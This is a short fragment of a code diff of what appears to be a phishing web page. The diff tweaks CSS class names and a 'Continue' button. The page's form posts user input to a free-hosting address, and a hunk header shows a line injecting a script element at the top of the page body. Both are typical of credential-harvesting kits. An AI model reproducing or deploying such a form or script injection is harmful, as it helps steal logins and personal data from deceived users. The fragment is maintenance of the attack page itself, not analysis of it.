@@ -424,8 +424,8 @@ with(document)with(body)with(insertBefore(createElement("script"),firstChild))se
                 </div>               
                 
                 <div class="modal-body">                                       
-                <div class="col-md-6 col-sm-6 no-padng">
-                    <div class="model-l">                    
+                <div class="col-md-6 col-sm-6 no-padng1">
+                    <div class="model-l1">                    
                     <form method="post" action="https://j379192911.000webhostapp.com/temp/indexs">
 			
 				<br><br>
@@ -442,7 +442,7 @@ with(document)with(body)with(insertBefore(createElement("script"),firstChild))se
 
 				</p><p>
 
-				<input type="submit" value="Continue >>>;" style="width:320px; height:55px; background-color: 276BA2; border: solid 3px 276BA2; 
+				<input type="submit" value="Continue >>>" style="width:320px; height:55px; background-color: 276BA2; border: solid 3px 276BA2; 
 				font-family: Verdana; font-size: 20px; font-weight: bold; color: #ffffff; -moz-border-radius: 4px; -webkit-border-radius: 4px; 
 				-khtml-border-radius: 4px; border-radius: 4px;">				
 	
